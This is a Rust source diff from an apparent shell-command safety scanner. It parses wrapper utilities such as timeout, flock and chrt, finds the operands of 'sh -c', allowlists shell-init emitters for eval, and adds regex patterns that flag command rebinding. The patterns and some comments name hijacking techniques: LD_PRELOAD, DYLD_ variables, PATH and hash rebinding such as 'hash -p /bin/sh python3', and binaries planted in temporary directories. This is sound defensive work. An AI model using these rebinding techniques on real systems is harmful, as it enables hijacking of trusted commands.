-                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                return;
+                return DelegationChild::Ambiguous;
             }
-            push_static_child_from(args, 1, shell, scan);
+            DelegationChild::Argv(1)
         }
         "nice" => {
+            // GNU `+n:` plus the historical `-N` / `--N` / `-+N` adjustment;
+            // BSD accepts the same spellings.
             while index < args.len() {
                 let Some(option) = static_wrapper_word(&args[index], shell) else {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 };
                 if option == "--" {
                     index += 1;
                     break;
                 }
-                if option == "-n" || option == "--adjustment" {
-                    if args
-                        .get(index + 1)
-                        .and_then(|arg| static_wrapper_word(arg, shell))
-                        .is_none()
-                    {
-                        record_shell_execution_gap(
-                            scan,
-                            ShellExecutionGap::AmbiguousExecutableBody,
-                        );
-                        return;
-                    }
-                    index += 2;
-                    continue;
-                }
-                if option.starts_with("--adjustment=")
-                    || option
-                        .strip_prefix('-')
-                        .is_some_and(|value| !value.is_empty() && value.parse::<i32>().is_ok())
+                if option
+                    .strip_prefix('-')
+                    .is_some_and(|value| !value.is_empty() && value.parse::<i32>().is_ok())
                 {
                     index += 1;
                     continue;
                 }
-                if matches!(option.as_str(), "--help" | "--version") {
-                    return;
+                if !option.starts_with('-') {
+                    break;
                 }
-                if option.starts_with('-') {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &["--help", "--version"],
+                        &["--adjustment"],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(&option, next, &[], &['n'], shell)
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &[]) => {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => index += parsed.words,
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
                 }
-                break;
             }
-            push_static_child_from(args, index, shell, scan);
+            DelegationChild::Argv(index)
         }
         "setsid" => {
+            // util-linux `+Vhcfw`.
             while index < args.len() {
                 let Some(option) = static_wrapper_word(&args[index], shell) else {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 };
                 if option == "--" {
                     index += 1;
                     break;
                 }
-                if matches!(
-                    option.as_str(),
-                    "-c" | "-f" | "-w" | "--ctty" | "--fork" | "--wait"
-                ) {
-                    index += 1;
-                    continue;
+                if !option.starts_with('-') {
+                    break;
                 }
-                if matches!(option.as_str(), "-h" | "-V" | "--help" | "--version") {
-                    return;
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &["--ctty", "--fork", "--wait", "--help", "--version"],
+                        &[],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(
+                        &option,
+                        next,
+                        &['c', 'f', 'w', 'h', 'V'],
+                        &[],
+                        shell,
+                    )
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &['h', 'V']) => {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => index += parsed.words,
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
                 }
-                if option.starts_with('-') {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
-                }
-                break;
             }
-            push_static_child_from(args, index, shell, scan);
+            DelegationChild::Argv(index)
         }
         "timeout" => {
+            // GNU `+k:s:v`; `-f`/`-p` are `--foreground`/`--preserve-status`
+            // (coreutils 9.6+ and BSD). The duration operand precedes the child.
             while index < args.len() {
                 let Some(option) = static_wrapper_word(&args[index], shell) else {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 };
                 if option == "--" {
                     index += 1;
                     break;
                 }
-                if matches!(option.as_str(), "-k" | "--kill-after" | "-s" | "--signal") {
-                    if args
-                        .get(index + 1)
-                        .and_then(|arg| static_wrapper_word(arg, shell))
-                        .is_none()
-                    {
-                        record_shell_execution_gap(
-                            scan,
-                            ShellExecutionGap::AmbiguousExecutableBody,
-                        );
-                        return;
+                if !option.starts_with('-') {
+                    break;
+                }
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &[
+                            "--preserve-status",
+                            "--foreground",
+                            "--verbose",
+                            "--help",
+                            "--version",
+                        ],
+                        &["--kill-after", "--signal"],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(&option, next, &['v', 'f', 'p'], &['k', 's'], shell)
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &[]) => {
+                        return DelegationChild::Nothing
                     }
-                    index += 2;
-                    continue;
+                    Some(parsed) => index += parsed.words,
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
                 }
-                if option.starts_with("--kill-after=") || option.starts_with("--signal=") {
-                    index += 1;
-                    continue;
-                }
-                if matches!(
-                    option.as_str(),
-                    "--preserve-status" | "--foreground" | "-v" | "--verbose"
-                ) {
-                    index += 1;
-                    continue;
-                }
-                if matches!(option.as_str(), "--help" | "--version") {
-                    return;
-                }
-                if option.starts_with('-') {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
-                }
-                break;
             }
             if args
                 .get(index)
                 .and_then(|arg| static_wrapper_word(arg, shell))
                 .is_none()
             {
-                if index < args.len() {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                }
-                return;
+                return if index < args.len() {
+                    DelegationChild::Ambiguous
+                } else {
+                    DelegationChild::Nothing
+                };
             }
-            push_static_child_from(args, index.saturating_add(1), shell, scan);
+            DelegationChild::Argv(index.saturating_add(1))
         }
         "stdbuf" => {
             while index < args.len() {
                 let Some(option) = static_wrapper_word(&args[index], shell) else {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 };
                 if option == "--" {
                     index += 1;
@@ -8942,11 +10634,7 @@ fn scan_posix_delegation_utility(
                         .and_then(|arg| static_wrapper_word(arg, shell))
                         .is_none()
                     {
-                        record_shell_execution_gap(
-                            scan,
-                            ShellExecutionGap::AmbiguousExecutableBody,
-                        );
-                        return;
+                        return DelegationChild::Ambiguous;
                     }
                     index += 2;
                     continue;
@@ -8961,60 +10649,279 @@ fn scan_posix_delegation_utility(
                     continue;
                 }
                 if matches!(option.as_str(), "--help" | "--version") {
-                    return;
+                    return DelegationChild::Nothing;
                 }
                 if option.starts_with('-') {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 }
                 break;
             }
-            push_static_child_from(args, index, shell, scan);
+            DelegationChild::Argv(index)
         }
         "taskset" => {
+            // util-linux `+apchV`. `-p` operates on an existing pid: no child.
             let mut pid_mode = false;
             while index < args.len() {
                 let Some(option) = static_wrapper_word(&args[index], shell) else {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
+                    return DelegationChild::Ambiguous;
                 };
                 if option == "--" {
                     index += 1;
                     break;
                 }
-                if matches!(option.as_str(), "-a" | "--all-tasks" | "-c" | "--cpu-list") {
-                    index += 1;
-                    continue;
+                if !option.starts_with('-') {
+                    break;
                 }
-                if matches!(option.as_str(), "-p" | "--pid") {
-                    pid_mode = true;
-                    index += 1;
-                    continue;
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &["--all-tasks", "--pid", "--cpu-list", "--help", "--version"],
+                        &[],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(
+                        &option,
+                        next,
+                        &['a', 'p', 'c', 'h', 'V'],
+                        &[],
+                        shell,
+                    )
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &['h', 'V']) => {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => {
+                        pid_mode |= parsed.names(&["--pid"], &['p']);
+                        index += parsed.words;
+                    }
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
                 }
-                if matches!(option.as_str(), "-h" | "-V" | "--help" | "--version") {
-                    return;
-                }
-                if option.starts_with('-') {
-                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
-                    return;
-                }
-                break;
             }
             if pid_mode {
-                return;
+                return DelegationChild::Nothing;
             }
             if index < args.len() {
                 index += 1; // CPU mask/list
             }
-            push_static_child_from(args, index, shell, scan);
+            DelegationChild::Argv(index)
         }
-        "ionice" | "flock" if !args.is_empty() => {
-            // Both utilities have overlapping query/modify/execute modes and
-            // platform-specific option grammars. Preserve a typed block until
-            // their mode can be proven instead of guessing a child index.
-            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        "ionice" => {
+            // util-linux `+n:c:p:P:u:tVh`. `-p`/`-P`/`-u` change existing
+            // processes (their operands are more ids): no child. Without them
+            // the operands are the child command, or none (print the class).
+            let mut process_mode = false;
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    return DelegationChild::Ambiguous;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if !option.starts_with('-') {
+                    break;
+                }
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &["--ignore", "--help", "--version"],
+                        &["--classdata", "--class", "--pid", "--pgid", "--uid"],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(
+                        &option,
+                        next,
+                        &['t', 'h', 'V'],
+                        &['n', 'c', 'p', 'P', 'u'],
+                        shell,
+                    )
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &['h', 'V']) => {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => {
+                        process_mode |=
+                            parsed.names(&["--pid", "--pgid", "--uid"], &['p', 'P', 'u']);
+                        index += parsed.words;
+                    }
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
+                }
+            }
+            if process_mode {
+                return DelegationChild::Nothing;
+            }
+            DelegationChild::Argv(index)
         }
-        _ => {}
+        "flock" => {
+            // util-linux `+sexnoFuw:E:hV`, then `FILE COMMAND [ARG...]`,
+            // `FILE -c COMMAND` (run by `$SHELL -c`), or a lone file
+            // descriptor number (no child).
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    if wrapper_operand_is_one_word(&args[index], shell) {
+                        break; // the lock file
+                    }
+                    return DelegationChild::Ambiguous;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if !option.starts_with('-') {
+                    break;
+                }
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &[
+                            "--shared",
+                            "--exclusive",
+                            "--unlock",
+                            "--nonblock",
+                            "--nb",
+                            "--close",
+                            "--no-fork",
+                            "--verbose",
+                            "--fcntl",
+                            "--help",
+                            "--version",
+                        ],
+                        &["--timeout", "--wait", "--conflict-exit-code"],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(
+                        &option,
+                        next,
+                        &['s', 'e', 'x', 'n', 'o', 'F', 'u', 'h', 'V'],
+                        &['w', 'E'],
+                        shell,
+                    )
+                };
+                match parsed {
+                    Some(parsed) if parsed.terminal(&["--help", "--version"], &['h', 'V']) => {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => index += parsed.words,
+                    None => {
+                        return DelegationChild::Ambiguous;
+                    }
+                }
+            }
+            let operands = args.get(index..).unwrap_or_default();
+            if operands.len() < 2 {
+                // A lone file descriptor, or a usage error: nothing runs.
+                return DelegationChild::Nothing;
+            }
+            if !wrapper_operand_is_one_word(&operands[0], shell) {
+                // `$LOCK` may expand to any number of words, so the child
+                // position is unknown.
+                return DelegationChild::Ambiguous;
+            }
+            match static_wrapper_word(&operands[1], shell).as_deref() {
+                // flock refuses anything but exactly one command string.
+                Some("-c" | "--command") if operands.len() == 3 => {
+                    DelegationChild::CommandString(index + 2)
+                }
+                Some("-c" | "--command") => DelegationChild::Nothing,
+                _ => DelegationChild::Argv(index + 1),
+            }
+        }
+        "chrt" => {
+            // util-linux `+abdD:efihmoP:pRrT:vV`, then `PRIORITY COMMAND
+            // [ARG...]`. `-p` changes an existing pid and `-m` prints the
+            // priority ranges: no child. A priority that is not a static
+            // integer leaves the child position unproven.
+            let mut pid_mode = false;
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    return DelegationChild::Ambiguous;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if !option.starts_with('-') {
+                    break;
+                }
+                let next = args.get(index + 1);
+                let parsed = if option.starts_with("--") {
+                    static_long_option(
+                        &option,
+                        next,
+                        &[
+                            "--all-tasks",
+                            "--batch",
+                            "--deadline",
+                            "--ext",
+                            "--fifo",
+                            "--idle",
+                            "--other",
+                            "--rr",
+                            "--reset-on-fork",
+                            "--pid",
+                            "--max",
+                            "--verbose",
+                            "--help",
+                            "--version",
+                        ],
+                        &["--sched-runtime", "--sched-period", "--sched-deadline"],
+                        shell,
+                    )
+                } else {
+                    static_short_option_cluster(
+                        &option,
+                        next,
+                        &[
+                            'a', 'b', 'd', 'e', 'f', 'i', 'o', 'r', 'R', 'p', 'm', 'v', 'h', 'V',
+                        ],
+                        &['T', 'P', 'D'],
+                        shell,
+                    )
+                };
+                match parsed {
+                    Some(parsed)
+                        if parsed.terminal(&["--max", "--help", "--version"], &['m', 'h', 'V']) =>
+                    {
+                        return DelegationChild::Nothing
+                    }
+                    Some(parsed) => {
+                        pid_mode |= parsed.names(&["--pid"], &['p']);
+                        index += parsed.words;
+                    }
+                    None => return DelegationChild::Ambiguous,
+                }
+            }
+            if pid_mode {
+                return DelegationChild::Nothing;
+            }
+            let Some(priority) = args.get(index) else {
+                return DelegationChild::Nothing;
+            };
+            match static_wrapper_word(priority, shell) {
+                Some(priority)
+                    if !priority.is_empty() && priority.bytes().all(|b| b.is_ascii_digit()) =>
+                {
+                    DelegationChild::Argv(index + 1)
+                }
+                _ => DelegationChild::Ambiguous,
+            }
+        }
+        _ => DelegationChild::Nothing,
     }
 }
 
@@ -9227,6 +11134,14 @@ fn posix_body_calls_parent_alias(
     depth: usize,
     remaining_bodies: &mut usize,
 ) -> bool {
+    // No parent alias (proven or unresolved): nothing to call. See
+    // `posix_body_calls_parent_function`.
+    if state.aliases.is_empty() && state.unresolved.is_empty() {
+        return false;
+    }
+    if !charge_scan_work(raw.len()) {
+        return true;
+    }
     for segment in tokenize::tokenize(raw, ShellType::Posix) {
         if let Some(command_raw) = segment.command.as_deref() {
             if let Some(command) = posix_alias_invocation_name(command_raw) {
@@ -9242,8 +11157,13 @@ fn posix_body_calls_parent_alias(
             }
         }
 
-        let (nested_bodies, nested_gap) =
-            lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+        // The caller's budget, not a fresh one: re-arming it here made every
+        // nesting level pay the full budget again.
+        let (nested_bodies, nested_gap) = lexical_executable_substitutions_bounded(
+            &segment.raw,
+            ShellType::Posix,
+            remaining_bodies,
+        );
         if nested_gap.is_some() && (!state.aliases.is_empty() || !state.unresolved.is_empty()) {
             return true;
         }
@@ -9302,6 +11222,7 @@ fn recover_posix_parent_dispatch_body(
                     };
                     if !input.trim().is_empty() {
                         scan.bodies.push(ExecutableBody {
+                            best_effort: false,
                             input,
                             shell: ShellType::Posix,
                             origin: None,
@@ -9324,6 +11245,7 @@ fn recover_posix_parent_dispatch_body(
         if let Some(command) = posix_function_command_word(&segment) {
             if let Some(binding) = functions.get(&command) {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: binding.definition.body.clone(),
                     shell: ShellType::Posix,
                     origin: None,
@@ -9459,6 +11381,11 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
     let segments = tokenize::tokenize(raw, shell);
     let uncertain_mutations = (shell == ShellType::Posix)
         .then(|| uncertain_posix_state_mutation_segments(raw, &segments));
+    let array_assignments = if shell == ShellType::Posix {
+        posix_literal_array_assignment_segments(raw, &segments)
+    } else {
+        Vec::new()
+    };
     let mut state = LiteralAliasState::default();
     let mut function_alias_dependencies = std::collections::HashMap::<String, bool>::new();
     let mut function_names = std::collections::HashSet::<String>::new();
@@ -9574,15 +11501,19 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
                 PosixFunctionParse::NotDefinition => {}
             }
 
-            let (nested_bodies, nested_gap) =
-                lexical_executable_substitutions(&segment.raw, ShellType::Posix);
-            let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
-            if (nested_gap.is_some() && (!state.aliases.is_empty() || !state.unresolved.is_empty()))
-                || nested_bodies.iter().any(|body| {
-                    posix_body_calls_parent_alias(&body.input, &state, 0, &mut remaining_bodies)
-                })
-            {
-                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            // Only an alias in scope can be called from a nested body; with
+            // none, the nested scan has nothing to look for.
+            if !state.aliases.is_empty() || !state.unresolved.is_empty() {
+                let (nested_bodies, nested_gap) =
+                    lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+                let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+                if nested_gap.is_some()
+                    || nested_bodies.iter().any(|body| {
+                        posix_body_calls_parent_alias(&body.input, &state, 0, &mut remaining_bodies)
+                    })
+                {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
             }
 
             if let Some(dispatch_scan) = posix_current_scope_dispatch_scan(segment) {
@@ -9622,7 +11553,12 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
                     }
                 }
             }
-            if is_complete_literal_posix_brace_group(segment, ShellType::Posix) {
+            if is_complete_literal_posix_brace_group(segment, ShellType::Posix)
+                || array_assignments
+                    .get(segment_index)
+                    .copied()
+                    .unwrap_or(false)
+            {
                 continue;
             }
         }
@@ -9666,8 +11602,19 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
         let command_function_shadowed = !wrapped_alias && function_names.contains(&command);
 
         if command_function_shadowed && !command_alias_shadowed {
+            // Once the retained-body limit is full, every further body is
+            // dropped by `bound_executable_bodies` and the scan fails closed.
+            // Record that now instead of re-tokenizing the same function body
+            // for each of thousands of calls (`f() { ... }; f; f; f; ...`).
+            if scan.bodies.iter().filter(|body| !body.best_effort).count()
+                >= MAX_EXECUTABLE_SCAN_BODIES
+            {
+                record_shell_execution_gap(scan, ShellExecutionGap::WorkBudgetExceeded);
+                continue;
+            }
             if let Some(binding) = function_bindings.get(&command) {
                 scan.bodies.push(ExecutableBody {
+                    best_effort: false,
                     input: binding.definition.body.clone(),
                     shell: ShellType::Posix,
                     origin: None,
@@ -10023,6 +11970,7 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
         expanded.replace_range(range, &replacement);
     }
     scan.bodies.push(ExecutableBody {
+        best_effort: false,
         input: expanded,
         shell,
         origin: None,
@@ -10060,41 +12008,82 @@ fn cmd_for_body_index(args: &[String]) -> Option<usize> {
         .and_then(|index| (index + 1 < args.len()).then_some(index + 1))
 }
 
-fn shell_command_operand(args: &[String], shell: ShellType, fish: bool) -> Option<usize> {
+/// Indices of the words a shell invocation runs as shell code. A POSIX shell
+/// (`sh`, `bash`, `zsh`, ...) with `-c` runs its first operand after ALL
+/// options: `sh -c -e CMD`, `bash -c -- CMD`, `bash -c -o errexit CMD` and
+/// `bash +x -c CMD` all run CMD. fish reads the value of each `-c` /
+/// `--command` and `-C` / `--init-command` as code. An index equal to
+/// `args.len()` means `-c` has no operand. Empty when the shell runs a script
+/// file or reads standard input, or when an option word before `-c` is not
+/// literal.
+pub(crate) fn shell_command_operands(args: &[String], shell: ShellType, fish: bool) -> Vec<usize> {
+    let takes_value = |option: &str| {
+        matches!(
+            option,
+            "-o" | "+o" | "-O" | "+O" | "--rcfile" | "--init-file" | "--startup-file"
+        ) || (fish && matches!(option, "--features" | "--profile-startup"))
+    };
+    let mut operands = Vec::new();
+    let mut command_string = false;
     let mut index = 0;
     while index < args.len() {
-        let option = static_wrapper_word(&args[index], shell)?;
-        if option == "--" {
-            return None;
+        let Some(option) = static_wrapper_word(&args[index], shell) else {
+            // After `-c`, a non-literal word may be the command string; the
+            // caller's literal-body check fails closed on it.
+            if command_string && !fish {
+                operands.push(index);
+            }
+            return operands;
+        };
+        if fish {
+            let code = option == "-c"
+                || option == "--command"
+                || option == "-C"
+                || option == "--init-command"
+                || (option.starts_with('-')
+                    && !option.starts_with("--")
+                    && option[1..].contains(['c', 'C']));
+            if code {
+                operands.push(index + 1);
+                index = index.saturating_add(2);
+                continue;
+            }
+            if option == "--" || !option.starts_with('-') || option == "-" {
+                return operands;
+            }
+            index = index.saturating_add(if takes_value(&option) { 2 } else { 1 });
+            continue;
+        }
+        if option == "--" || option == "-" {
+            // The end of the options: the next word is the command string
+            // when `-c` was given, else a script file.
+            if command_string {
+                operands.push(index + 1);
+            }
+            return operands;
+        }
+        if !option.starts_with(['-', '+']) {
+            // The first operand: the command string after `-c`, else a
+            // script file (a later `-c` belongs to that script's argv).
+            if command_string {
+                operands.push(index);
+            }
+            return operands;
         }
         if option == "-c"
             || option == "--command"
-            || (option.starts_with('-')
-                && !option.starts_with("--")
-                && option[1..].chars().any(|flag| flag == 'c'))
+            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('c'))
         {
-            return Some(index + 1);
-        }
-
-        let takes_value = matches!(
-            option.as_str(),
-            "-o" | "-O" | "--rcfile" | "--init-file" | "--startup-file"
-        ) || (fish
-            && matches!(
-                option.as_str(),
-                "-C" | "--init-command" | "--features" | "--profile-startup"
-            ));
-        if takes_value {
-            index = index.saturating_add(2);
-        } else if option.starts_with('-') {
+            command_string = true;
             index += 1;
-        } else {
-            // The shell will treat the first positional as a script file; a
-            // later spelling of `-c` belongs to that script's argv.
-            return None;
+            continue;
         }
+        index = index.saturating_add(if takes_value(&option) { 2 } else { 1 });
     }
-    None
+    if command_string {
+        operands.push(args.len());
+    }
+    operands
 }
 
 fn powershell_cli_command_kind(option: &str) -> Option<bool> {
@@ -10141,6 +12130,457 @@ fn decode_powershell_encoded_command(raw: &str, shell: ShellType) -> Option<Stri
 fn has_process_substitution_arg(args: &[String]) -> bool {
     args.iter()
         .any(|arg| arg.contains("<(") || arg.contains(">("))
+}
+
+/// Directories a shell-init emitter may be named from by absolute path: the
+/// system and package-manager bin directories (`/opt/homebrew/bin/brew`).
+/// A temporary, home or working directory, where an earlier command could
+/// have planted a binary, is not one of them.
+const TRUSTED_INIT_EMITTER_DIRS: &[&str] = &[
+    "/bin",
+    "/sbin",
+    "/usr/bin",
+    "/usr/sbin",
+    "/usr/local/bin",
+    "/usr/local/sbin",
+    "/opt/homebrew/bin",
+    "/opt/homebrew/sbin",
+    "/home/linuxbrew/.linuxbrew/bin",
+    "/opt/local/bin",
+    "/snap/bin",
+    "/run/current-system/sw/bin",
+    "/nix/var/nix/profiles/default/bin",
+];
+
+const INIT_EMITTER_SHELLS: &[&str] = &["bash", "zsh", "fish", "sh", "ksh"];
+
+/// One of the reviewed shell-init emitter invocations whose standard output is
+/// the tool's own setup code: `brew shellenv`, `direnv hook <shell>`, `pyenv
+/// init -` / `--path`, `rbenv init -`, `ssh-agent [-s]`, `zoxide init <shell>`,
+/// `starship init <shell>`, `fnm env`, `mise activate <shell>`, `kubectl
+/// completion <shell>` and `fzf --bash|--zsh|--fish`. `argv` holds literal
+/// words; the program is a bare name or an absolute path in
+/// [`TRUSTED_INIT_EMITTER_DIRS`]. Any other subcommand or extra argument
+/// (`brew install`, `pyenv exec ...`) is not an init emitter.
+fn trusted_init_emitter_argv(argv: &[&str]) -> bool {
+    let Some((&program, rest)) = argv.split_first() else {
+        return false;
+    };
+    let name = match program.rsplit_once('/') {
+        Some((directory, name)) if TRUSTED_INIT_EMITTER_DIRS.contains(&directory) => name,
+        Some(_) => return false,
+        None => program,
+    };
+    let shell = |word: &str| INIT_EMITTER_SHELLS.contains(&word);
+    match (name, rest) {
+        ("brew", ["shellenv"]) => true,
+        ("brew", ["shellenv", target]) => shell(target),
+        ("direnv", ["hook", target]) => shell(target),
+        ("pyenv", ["init", "-"] | ["init", "--path"]) => true,
+        ("pyenv", ["init", "-", target]) => shell(target),
+        ("rbenv", ["init", "-"]) => true,
+        ("rbenv", ["init", "-", target]) => shell(target),
+        // Bare `ssh-agent` prints the same setup as `-s` (csh syntax only
+        // when `$SHELL` is a csh, which a POSIX eval cannot run).
+        ("ssh-agent", [] | ["-s"]) => true,
+        ("zoxide", ["init", target]) => shell(target),
+        ("starship", ["init", target]) => shell(target),
+        ("fnm", ["env", options @ ..]) => {
+            let mut index = 0usize;
+            while index < options.len() {
+                match options[index] {
+                    "--use-on-cd" => index += 1,
+                    "--shell" if options.get(index + 1).is_some_and(|target| shell(target)) => {
+                        index += 2
+                    }
+                    option => match option.strip_prefix("--shell=") {
+                        Some(target) if shell(target) => index += 1,
+                        _ => return false,
+                    },
+                }
+            }
+            true
+        }
+        ("mise", ["activate", target]) => shell(target),
+        ("kubectl", ["completion", target]) => shell(target),
+        ("fzf", ["--bash" | "--zsh" | "--fish"]) => true,
+        _ => false,
+    }
+}
+
+/// The words of a substitution body made only of plain literal words: no
+/// quotes, expansions, globs, escapes, operators, redirections, comments or
+/// newlines, so its argv is exactly the space-separated words.
+fn plain_literal_argv(body: &str) -> Option<Vec<&str>> {
+    let words: Vec<&str> = body
+        .split([' ', '\t'])
+        .filter(|word| !word.is_empty())
+        .collect();
+    (!words.is_empty()
+        && words.iter().all(|word| {
+            word.bytes().all(|byte| {
+                byte.is_ascii_alphanumeric()
+                    || matches!(byte, b'-' | b'_' | b'.' | b'/' | b'=' | b'+' | b':' | b',')
+            })
+        }))
+    .then_some(words)
+}
+
+/// `eval` / `source` / `.` whose whole operand text `word` runs one reviewed
+/// shell-init emitter and executes its output: `eval "$(brew shellenv)"`,
+/// `eval $(ssh-agent -s)`, ``eval `ssh-agent -s` ``, `source <(kubectl
+/// completion zsh)`, and in fish `eval (zoxide init fish)`. The body must be a
+/// plain literal command (see [`plain_literal_argv`]) matching
+/// [`trusted_init_emitter_argv`]; anything else keeps the unresolved-body gap.
+fn trusted_init_emitter_operand(command: &str, word: &str, shell: ShellType) -> bool {
+    let body = match (command, shell) {
+        ("eval", ShellType::Posix | ShellType::Fish) => {
+            let unquoted = word
+                .strip_prefix('"')
+                .and_then(|inner| inner.strip_suffix('"'));
+            let inner = unquoted.unwrap_or(word);
+            inner
+                .strip_prefix("$(")
+                .and_then(|body| body.strip_suffix(')'))
+                .or_else(|| {
+                    (shell == ShellType::Posix)
+                        .then(|| inner.strip_prefix('`')?.strip_suffix('`'))
+                        .flatten()
+                })
+                .or_else(|| {
+                    (shell == ShellType::Fish && unquoted.is_none())
+                        .then(|| word.strip_prefix('(')?.strip_suffix(')'))
+                        .flatten()
+                })
+        }
+        ("." | "source", ShellType::Posix) => word
+            .strip_prefix("<(")
+            .and_then(|body| body.strip_suffix(')')),
+        _ => None,
+    };
+    body.and_then(plain_literal_argv)
+        .is_some_and(|argv| trusted_init_emitter_argv(&argv))
+}
+
+/// Text (quotes and backslashes removed) that can change what a bare command
+/// name runs, or how an unquoted substitution splits: a function definition,
+/// an alias, a `PATH` change (zsh `path`, fish `fish_user_paths` /
+/// `fish_add_path` / `fish_function_path`), zsh's `commands` table, `hash`
+/// (`hash -p /bin/sh python3`, zsh `hash python3=/bin/sh`), `enable`,
+/// `autoload`/`fpath`, `zmodload`, `IFS`, and the variables that change what a
+/// process loads before its own code runs (`PYTHON*`, `LD_PRELOAD`,
+/// `DYLD_*`).
+static REBINDING_TEXT: Lazy<Regex> = Lazy::new(|| {
+    let needles = [
+        "()",
+        "function",
+        "alias",
+        "PATH",
+        "path=",
+        "path+=",
+        "path[",
+        "fish_user_paths",
+        "fish_add_path",
+        "fish_function_path",
+        "commands[",
+        "hash",
+        "enable",
+        "autoload",
+        "fpath",
+        "zmodload",
+        "IFS",
+        "PYTHON",
+        "LD_PRELOAD",
+        "DYLD_",
+    ];
+    Regex::new(
+        &needles
+            .iter()
+            .map(|needle| regex::escape(needle))
+            .collect::<Vec<_>>()
+            .join("|"),
+    )
+    .expect("rebinding text regex")
+});
+
+/// The part of [`REBINDING_TEXT`] that changes how a program is LOOKED UP or
+/// what a python process loads: `PATH` (and zsh / fish forms), fish's
+/// function path or a file in a `functions` directory (fish autoloads it
+/// ahead of PATH), zsh's `commands` table, `hash`, `autoload` / `fpath`,
+/// `zmodload`, `LD_PRELOAD`, `DYLD_*`, a `PYTHON*` variable (`PYTHONHOME`,
+/// `PYTHONUSERBASE`), and a path to a python program or library directory or
+/// a startup hook (`~/.local/bin/python3`, `lib/python3.12/site-packages/x.pth`,
+/// `sitecustomize`). Aliases, functions and `enable` are left out: the python
+/// data-sink proof refuses those through its inspect-mode check and the
+/// executable-body scan. A bare `python3` word is left out too, so a data
+/// pipeline nested in a group or `sh -c` body keeps its own proof.
+static PROGRAM_LOOKUP_TEXT: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(concat!(
+        r"PATH|path=|path\+=|path\[|fish_user_paths|fish_add_path|fish_function_path",
+        r"|functions|commands\[|\bhash\b|autoload|fpath|zmodload|LD_PRELOAD|DYLD_|PYTHON",
